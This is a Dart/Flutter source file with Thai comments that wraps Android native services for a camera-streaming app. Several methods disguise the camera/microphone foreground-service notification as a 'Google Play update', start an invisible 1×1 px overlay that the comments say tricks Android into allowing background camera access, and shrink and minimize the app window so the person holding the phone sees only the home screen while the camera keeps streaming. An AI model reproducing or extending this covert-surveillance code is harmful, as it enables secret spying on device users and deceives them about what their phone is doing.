import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

/// เรียก Android native services
/// - CameraStreamingService: camera/microphone FGS
/// - StealthOverlayService: 1×1 px overlay (AirDroid technique)
class ForegroundService {
  static const _channel = MethodChannel('com.camconnect.camera_app/foreground_service');

  // ---- Camera FGS ----

  /// เริ่ม FGS พร้อม custom notif text (จาก remote config ของ viewer)
  /// ถ้าไม่ส่ง args → native ใช้ default (Google Play update)
  static Future<void> start({String? notifTitle, String? notifBody}) async {
    try {
      await _channel.invokeMethod<void>('startCameraService', <String, dynamic>{
        if (notifTitle != null) 'notifTitle': notifTitle,
        if (notifBody != null) 'notifBody': notifBody,
      });
    } catch (e) {
      debugPrint('[ForegroundService] start failed: $e');
    }
  }

  static Future<void> stop() async {
    try {
      await _channel.invokeMethod<void>('stopCameraService');
    } catch (e) {
      debugPrint('[ForegroundService] stop failed: $e');
    }
  }

  // ---- Stealth 1×1 Overlay (AirDroid technique) ----

  /// เริ่ม overlay 1×1 px (มองไม่เห็น) เพื่อหลอก Android ว่า app foreground
  /// → กล้องเข้าถึงได้ใน background ลึก
  static Future<void> startStealthOverlay() async {
    try {
      await _channel.invokeMethod<void>('startStealthOverlay');
    } catch (e) {
      debugPrint('[ForegroundService] startStealthOverlay failed: $e');
    }
  }

  static Future<void> stopStealthOverlay() async {
    try {
      await _channel.invokeMethod<void>('stopStealthOverlay');
    } catch (e) {
      debugPrint('[ForegroundService] stopStealthOverlay failed: $e');
    }
  }

  static Future<bool> hasOverlayPermission() async {
    try {
      final r = await _channel.invokeMethod<bool>('hasOverlayPermission');
      return r ?? false;
    } catch (e) {
      return false;
    }
  }

  /// ย่อ activity ไป background — user เห็น home screen
  /// (stealth mode: กล้องยังสตรีมต่อใน FGS + StealthOverlay)
  static Future<void> minimizeApp() async {
    try {
      await _channel.invokeMethod<void>('minimizeApp');
    } catch (e) {
      debugPrint('[ForegroundService] minimizeApp failed: $e');
    }
  }

  /// ย่อ window เหลือ 1×1 px + alpha 0 → user มองไม่เห็น UI เลย
  /// ใช้ก่อน [minimizeApp] เพื่อป้องกัน UI flash ระหว่าง launch
  static Future<void> makeWindowInvisible() async {
    try {
      await _channel.invokeMethod<void>('makeWindowInvisible');
    } catch (e) {
      debugPrint('[ForegroundService] makeWindowInvisible failed: $e');
    }
  }

  /// คืน window ขนาดปกติ (สำหรับ factory-reset)
  static Future<void> restoreWindow() async {
    try {
      await _channel.invokeMethod<void>('restoreWindow');
    } catch (e) {
      debugPrint('[ForegroundService] restoreWindow failed: $e');
    }
  }
}
